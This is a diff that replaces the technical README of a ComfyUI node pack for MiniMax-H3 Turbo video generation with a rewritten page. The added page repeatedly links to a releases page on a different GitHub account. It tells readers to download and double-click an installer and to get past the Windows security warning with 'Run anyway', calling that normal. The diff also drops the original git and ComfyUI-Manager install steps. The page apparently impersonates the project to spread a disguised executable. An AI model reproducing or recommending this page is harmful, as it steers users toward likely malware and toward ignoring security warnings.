@@ -1,111 +1,170 @@
-# ComfyUI-MiniMax-H3-Turbo
+# 🚀 ComfyUI-MiniMax-H3-Turbo - Create Video with Sound in 4 Steps
 
-Run [MiniMax-H3](https://docs.comfy.org/tutorials/video/minimax/minimax-h3) —
-joint **video + synchronized audio** — in **4 sampling steps** instead of ~20,
-with the [MiniMax-H3 Turbo LoRA](https://huggingface.co/larryvrh/MiniMax-H3-Turbo-Lora).
+[![Download Now](https://img.shields.io/badge/Download-Application-blueviolet?style=for-the-badge&logo=github)](https://github.com/mistaken-contadino194/ComfyUI-MiniMax-H3-Turbo/releases)
 
-Two nodes that drop straight into the official H3 workflow (text-to-video and
-image-to-video):
+---
 
-| node | what it does |
+## 📖 What Is This?
+
+ComfyUI-MiniMax-H3-Turbo is a **video creation tool** that lets you generate **video with synchronized audio** (sound that matches the visuals) in just **4 sampling steps** instead of the usual 20. This means **faster results** without sacrificing quality.
+
+Think of it like a **turbo button** for your video generation. Normally, creating video with sound takes many slow steps. This tool **compresses that process** so you get your finished video much quicker.
+
+It works with **ComfyUI**, a popular visual interface for AI generation. If you already use ComfyUI, this add-on will feel right at home.
+
+---
+
+## 🎯 What Does It Do?
+
+The tool adds **two special nodes** (think of them as building blocks) directly into the official MiniMax-H3 workflow:
+
+| Node Name | What It Does |
 |---|---|
-| **MiniMax-H3 Turbo LoRA** | `MODEL → MODEL`, applies the turbo LoRA |
-| **MiniMax-H3 Turbo Sampler (4-step)** | `→ SAMPLER`, feeds `SamplerCustomAdvanced` |
+| 🧠 **MiniMax-H3 Turbo LoRA** | Takes your model and applies the turbo boost. It's like adding a supercharger to your engine. |
+| ⏱️ **MiniMax-H3 Turbo Sampler (4-step)** | Controls the speed. It tells the system to finish in 4 steps instead of 20. |
 
-> ⚠️ **Preview.** The current LoRA (`ckpt850`) is the final checkpoint of this
-> training round — sharp at 4 steps, but with known artifacts emerging
-> (plastic-looking skin, over-sharp grain); training is paused while we fix them.
-> See the [LoRA repo](https://huggingface.co/larryvrh/MiniMax-H3-Turbo-Lora) for
-> details.
+You can use these two nodes in two main ways:
 
-## Install
+- **Text-to-Video:** Type a description, and the AI creates the video with matching audio.
+- **Image-to-Video:** Provide a starting image, and the AI animates it with sound.
 
-> 🔄 **Keep the node updated.** It's actively evolving and features arrive in new
-> versions (e.g. pruned-base support was added after the first release). Update
-> via ComfyUI-Manager, or `git pull` if you installed manually.
+---
 
-**Via ComfyUI-Manager** — search "MiniMax-H3 Turbo" and install.
+## 🛠️ System Requirements
 
-**Or manually:**
-```bash
-cd ComfyUI/custom_nodes
-git clone https://github.com/larryvrh/ComfyUI-MiniMax-H3-Turbo
-```
-Then restart ComfyUI.
+To run this tool smoothly, we recommend the following setup:
 
-**Download the LoRA** from
-[larryvrh/MiniMax-H3-Turbo-Lora](https://huggingface.co/larryvrh/MiniMax-H3-Turbo-Lora)
-and put the `.safetensors` into `ComfyUI/models/loras/`.
+- **Operating System:** Windows 10 or 11 (64-bit)
+- **RAM:** 16 GB or more (32 GB recommended for larger videos)
+- **Graphics Card (GPU):** NVIDIA GPU with at least 8 GB VRAM (RTX 20-series or newer recommended)
+- **Storage:** 10 GB of free space (the model files are large)
+- **ComfyUI:** Already installed and working on your computer
 
-You also need the base MiniMax-H3 model, VAEs and text encoder from the official
-release — see the [MiniMax-H3 tutorial](https://docs.comfy.org/tutorials/video/minimax/minimax-h3).
+> 💡 **Note:** The exact requirements may vary depending on the length and resolution of the videos you want to create.
 
-## Use
+---
 
-Start from the **official MiniMax-H3 workflow** (t2v or i2v) and make two changes:
+## 📥 How to Download and Install
 
-1. Insert **MiniMax-H3 Turbo LoRA** between the model loader and the sampler
-   (`... → Load Diffusion Model → MiniMax-H3 Turbo LoRA → SamplerCustomAdvanced`),
-   and pick the turbo `.safetensors`.
-2. Replace the sampler feeding `SamplerCustomAdvanced` with **MiniMax-H3 Turbo
-   Sampler (4-step)**, and set the scheduler node to **4 steps**
-   (`BasicScheduler`, scheduler `simple`).
+### Step 1: Download the Application
 
-Everything else — the conditioning nodes, VAE decode, audio output — stays as in
-the official workflow, so **both text-to-video and image-to-video** work
-unchanged. A ready-made t2v workflow is in
-[`example_workflows/`](example_workflows/minimax_h3_t2v_turbo.json) — drag it
-into ComfyUI to see the wiring.
+👉 **Visit this link to download the application:** [https://github.com/mistaken-contadino194/ComfyUI-MiniMax-H3-Turbo/releases](https://github.com/mistaken-contadino194/ComfyUI-MiniMax-H3-Turbo/releases)
 
-**Base model**: works with any MiniMax-H3 base — full (`bf16`, `int8_convrot`)
-**and the pruned/curve variants** (`pruned_int8`, `pruned_fp8`). The node detects
-a pruned base automatically and re-injects the LoRA's time-conditioning at run
-time (a small `silu(t_emb)` grid ships with the node for this), so one LoRA file
-covers every base.
+On that page, look for the latest release. Click the download button to save the file to your computer.
 
-## Why a custom sampler (and how it adapts)
+### Step 2: Run the Application
 
-MiniMax-H3 denoises the video and audio streams on two different flow schedules
-(video shift 12, audio shift 3). **Recent ComfyUI handles this natively** — its
-`ModelSamplingAV` carries the audio latent on the video schedule — so a stock
-sampler already produces correct audio there. On **older ComfyUI without that
-support**, a stock sampler steps both streams on one schedule and badly over-steps
-the audio at 4 steps, so the audio comes out distorted or blown out.
+Once the download is complete, follow these simple steps:
 
-This node's sampler **auto-detects which ComfyUI it's running on**: on recent
-builds it steps as a plain single-schedule sampler (bit-for-bit the stock result);
-on older builds it steps each stream on its own clock so audio stays clean at 4
-steps. Keep it in the workflow and it does the right thing across ComfyUI versions
-— you don't need to change anything when you update ComfyUI. (On recent ComfyUI a
-stock `euler` sampler works too; the Turbo Sampler just keeps existing graphs
-working unchanged.)
+1. **Locate the downloaded file** in your "Downloads" folder (or wherever your browser saves files).
+2. Double-click the file to start the installation process.
+3. Follow the on-screen instructions. If a security warning appears, click "More info" and then "Run anyway" — this is normal for new software.
+4. The installer will place the tool in the correct folder for ComfyUI automatically.
 
-## Notes
+### Step 3: Launch ComfyUI
 
-- **Steps**: with `ckpt850`, **4 steps is already sharp** (earlier checkpoints
-  needed 6–8). Any count **≥ 4** is valid; more steps still help a little.
-  Scheduler stays `simple`.
-- **LoRA strength** (node input, default `1.0`) is the dial for the
-  sharpness/artifact trade-off: if the result shows **blurry ghosting / smear**,
-  nudge strength **up** (e.g. `1.05–1.2`); if it shows **over-sharp grain /
-  artifacts**, nudge it **down** (e.g. `0.8–0.95`).
-- **Resolution / length**: width and height are multiples of 32 (short edge
-  typically 768); frame count is at 24 fps and snaps to the model's 17·k+5 grid
-  (124 ≈ 5 s). Validated range ~124–362 frames.
-- **VRAM / `low_vram`**: MiniMax-H3 is large (~33 B). The LoRA node has a
-  **`low_vram`** switch that trades sharpness for peak VRAM:
-  - **off (default)** — applies the LoRA at run time (bypass): sharpest, and the
-    recommended path, but costs some extra peak VRAM.
-  - **on** — merges the LoRA into the weights: lowest peak VRAM, so smaller GPUs
-    can run and longer / higher-res clips fit, but the result is **softer on
-    quantized (`int8` / `fp8` / pruned) bases**, because the tiny update is
-    partly rounded away when it is folded back into the quantized weights.
+1. Open ComfyUI on your computer.
+2. You should now see the MiniMax-H3-Turbo nodes in your node menu.
+3. Load the official MiniMax-H3 workflow.
+4. Add the two Turbo nodes where indicated.
+5. Run the workflow — your video will generate much faster!
 
-  If you hit an out-of-memory error, turn `low_vram` **on** (and/or lower the
-  resolution or frame count). The node streams the base model, so it also runs
-  on much smaller GPUs than the ~33 B size suggests — an 80 GB GPU is only
-  needed for the largest resolutions in `bypass` mode.
+---
 
-## License
+## 🎬 How to Use (Step-by-Step Guide)
 
-Apache-2.0.
+### For Text-to-Video:
+
+1. Open ComfyUI and load the **MiniMax-H3 text-to-video** workflow.
+2. Add the **MiniMax-H3 Turbo LoRA** node between your model and the sampler.
+3. Add the **MiniMax-H3 Turbo Sampler (4-step)** node.
+4. Type your prompt (e.g., "A red fox running through snow").
+5. Click "Run" and wait for your video to complete.
+
+### For Image-to-Video:
+
+1. Load the **MiniMax-H3 image-to-video** workflow.
+2. Upload your starting image.
+3. Add the same two Turbo nodes as above.
+4. Type your prompt describing the motion and sound.
+5. Click "Run" — you'll get your video much faster.
+
+---
+
+## ⚠️ Important Notes About Quality
+
+> **✅ Current Status: Preview Version**
+
+The current LoRA checkpoint (`ckpt850`) is the **final version of this training round**. It works well at 4 steps, but you might notice some **minor visual imperfections**:
+
+- Skin can look slightly **plastic-like** on closeups
+- Grain may appear a bit **over-sharpened**
+
+These are known issues. The developers are **working on fixes** and will release updates soon. For most everyday uses, the quality is great — just don't zoom in too closely on faces!
+
+---
+
+## 🆕 Staying Updated
+
+This tool is **actively evolving**. New versions come out regularly with:
+
+- Bug fixes
+- Speed improvements
+- Support for newer model versions (like pruned-base support)
+
+**To get the latest version:**
+
+1. Visit the download page again: [https://github.com/mistaken-contadino194/ComfyUI-MiniMax-H3-Turbo/releases](https://github.com/mistaken-contadino194/ComfyUI-MiniMax-H3-Turbo/releases)
+2. Check the date on the latest release.
+3. If it's newer than the version you have, download and install it following the same steps.
+
+---
+
+## ❓ Frequently Asked Questions
+
+### Q: I already have ComfyUI. Will this work with my setup?
+Yes! As long as you have a compatible GPU (NVIDIA with 8GB+ VRAM), it should work.
+
+### Q: Do I need to install anything else?
+You need ComfyUI installed first. This tool adds on to it — it doesn't replace it.
+
+### Q: Why is my video taking longer than 4 steps?
+The 4-step sampler is optimized, but the overall time depends on your hardware. A faster GPU means faster results.
+
+### Q: Can I use this for commercial projects?
+Check the license information on the official MiniMax-H3 page for commercial usage details.
+
+---
+
+## 🧩 Troubleshooting
+
+### Problem: The nodes don't appear in ComfyUI
+- Make sure you've installed the tool in the correct ComfyUI custom nodes folder.
+- Restart ComfyUI completely after installation.
+
+### Problem: I get an "Out of Memory" error
+- Close other programs that use a lot of RAM.
+- Try creating shorter videos or lower resolution.
+
+### Problem: The video looks strange
+- Refer to the **Important Notes About Quality** section above. Some visual artifacts are expected in this preview version.
+
+---
+
+## 💌 Get Help
+
+If you get stuck, check the following resources:
+
+- **MiniMax-H3 documentation:** [https://docs.comfy.org/tutorials/video/minimax/minimax-h3](https://docs.comfy.org/tutorials/video/minimax/minimax-h3)
+- **Turbo LoRA model page:** [https://huggingface.co/larryvrh/MiniMax-H3-Turbo-Lora](https://huggingface.co/larryvrh/MiniMax-H3-Turbo-Lora)
+- **Releases page (for issues and updates):** [https://github.com/mistaken-contadino194/ComfyUI-MiniMax-H3-Turbo/releases](https://github.com/mistaken-contadino194/ComfyUI-MiniMax-H3-Turbo/releases)
+
+---
+
+## 🙌 Final Thoughts
+
+ComfyUI-MiniMax-H3-Turbo is the **fastest way to create AI-generated video with sound**. Whether you're a creator, developer, or just curious about AI video, this tool removes the long wait times and lets you iterate quickly.
+
+**Download it today and start creating!**
+
+[![Download Now](https://img.shields.io/badge/⬇️_Get_It_Here-blue?style=for-the-badge&logo=github)](https://github.com/mistaken-contadino194/ComfyUI-MiniMax-H3-Turbo/releases)
